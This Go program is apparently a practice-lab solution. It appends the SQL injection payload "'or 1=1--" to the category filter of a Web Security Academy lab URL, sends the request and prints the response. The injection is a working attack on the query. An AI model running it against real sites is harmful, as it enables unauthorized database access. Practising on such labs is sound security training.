package main

import 
	(
	"fmt"
	"net/http"
	"io/ioutil"
	)

//var payload, url string = "'or 1=1--", "https://" + payload


func main() {

	payload := "'or+1=1--"
	url := "https://ac121f8c1e8c2b31c01c2774000a0014.web-security-academy.net/filter?category=Accessories" + payload
	method := "GET"
	
	fmt.Println("Url: " + url)

	client := &http.Client {
	}
	req, err := http.NewRequest(method, url, nil)
  
	if err != nil {
	  fmt.Println(err)
	  return
	}
	res, err := client.Do(req)
	if err != nil {
	  fmt.Println(err)
	  return
	}
	defer res.Body.Close()
  
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
	  fmt.Println(err)
	  return
	}
	fmt.Println(string(body))
}

